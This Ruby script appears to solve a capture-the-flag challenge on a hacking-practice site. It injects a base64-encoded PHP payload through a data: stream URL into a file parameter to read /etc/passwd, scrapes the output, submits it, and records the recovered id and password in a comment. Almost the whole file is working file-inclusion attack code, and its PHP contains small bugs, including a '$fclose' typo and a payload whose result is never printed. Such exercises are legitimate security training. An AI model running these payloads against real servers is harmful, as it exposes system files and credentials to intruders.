# encoding: utf-8
# php data scheme stream
require 'base64'
require_relative 'hack_utils'

# see also:
#   https://gihyo.jp/dev/serial/01/php-security/0037
#   http://www.asahi-net.or.jp/~wv7y-kmr/memo/php_security.html#PHP_allow_url_include

code = <<EOS
<?php
$fp = fopen("/etc/passwd", "r");
while(!feof($fp)) {
   $str = fgets($fp);
   print($str);
}
$fclose($fp);
?>
EOS

code = "<?php file_get_contents('/etc/passwd') ?>"

encoded = Base64.encode64(code).gsub(/\n/,'')
url = "http://www.hackerschool.jp/hack/take43.php?file=data:text/plain,base64,#{encoded}"
puts url

# extract /etc/passwd data from div element
params = { :hoge => 'a' } # dummy data
resp  = RestClient.post url, params
doc = Nokogiri::HTML(resp.body)
id, pass = doc.css('div.alert.alert-info').text.strip.split(':')

# post answer
puts "id:#{id}, pass:#{pass}"
HackUtils.post_answer 43, { :input_id => id, :pass => pass }
# id:8946user, pass:NV6qHt8t
